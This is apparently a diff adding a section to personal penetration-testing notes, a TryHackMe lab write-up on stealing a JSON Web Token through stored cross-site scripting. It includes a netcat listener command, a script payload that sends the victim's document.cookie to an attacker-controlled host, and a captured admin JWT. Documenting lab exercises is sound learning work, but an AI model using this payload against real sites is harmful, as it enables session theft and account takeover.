@@ -305,6 +305,92 @@ Content-Length: 91
 </comment>
 ```
 
+## XSS - Steal JVT
+
+Examples
+
+[#xss-steal-jvt](../../walkthroughs/tryhackme/the-marketplace.md#xss-steal-jvt "mention")
+
+[https://jwt.io/](https://jwt.io/)
+
+<figure><img src="../../.gitbook/assets/image (522).png" alt=""><figcaption></figcaption></figure>
+
+
+
+<figure><img src="../../.gitbook/assets/image (523).png" alt=""><figcaption></figcaption></figure>
+
+
+
+
+
+I tried updating the token it didn't work
+
+<figure><img src="../../.gitbook/assets/image (526).png" alt=""><figcaption></figcaption></figure>
+
+<figure><img src="../../.gitbook/assets/image (527).png" alt=""><figcaption></figcaption></figure>
+
+
+
+Next we're going to try to steal the JWT from another user.
+
+**Kali**
+
+```
+nc -lvnp 4444
+```
+
+**Browser**
+
+```
+<script>document.location='http://$KALI:4444/XSS/grabber.php?c='+document.cookie</script>
+```
+
+<figure><img src="../../.gitbook/assets/image (530).png" alt=""><figcaption></figcaption></figure>
+
+This was annoying because if I went to my posts it wouldn't work so I went to Jakes post and changed the number from 2 to 6 to get to the report page. Then just clicked the report button
+
+<figure><img src="../../.gitbook/assets/image (531).png" alt=""><figcaption></figcaption></figure>
+
+we got a token from a user that isn't us
+
+<figure><img src="../../.gitbook/assets/image (533).png" alt=""><figcaption></figcaption></figure>
+
+
+
+We can see it is from Michael who is an admin.
+
+<figure><img src="../../.gitbook/assets/image (532).png" alt=""><figcaption></figcaption></figure>
+
+
+
+
+
+<figure><img src="../../.gitbook/assets/image (534).png" alt=""><figcaption></figcaption></figure>
+
+
+
+
+
+Sent again but this time just forwarded the request so we could see what that script was doing
+
+<figure><img src="../../.gitbook/assets/image (535).png" alt=""><figcaption></figcaption></figure>
+
+
+
+The script was printing the flag
+
+<figure><img src="../../.gitbook/assets/image (536).png" alt=""><figcaption></figcaption></figure>
+
+This wasn't working before but after next time I went to this box tried I could just update the cookie from the browser and it worked.
+
+<figure><img src="../../.gitbook/assets/image (537).png" alt=""><figcaption></figcaption></figure>
+
+**Brower cookie**
+
+```
+eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjIsInVzZXJuYW1lIjoibWljaGFlbCIsImFkbWluIjp0cnVlLCJpYXQiOjE3MDE1MjgzODN9.O8218jJ0nmWedeewklX6fkb9sjlgH81ciU7dJG5l9YY
+```
+
 
 
 
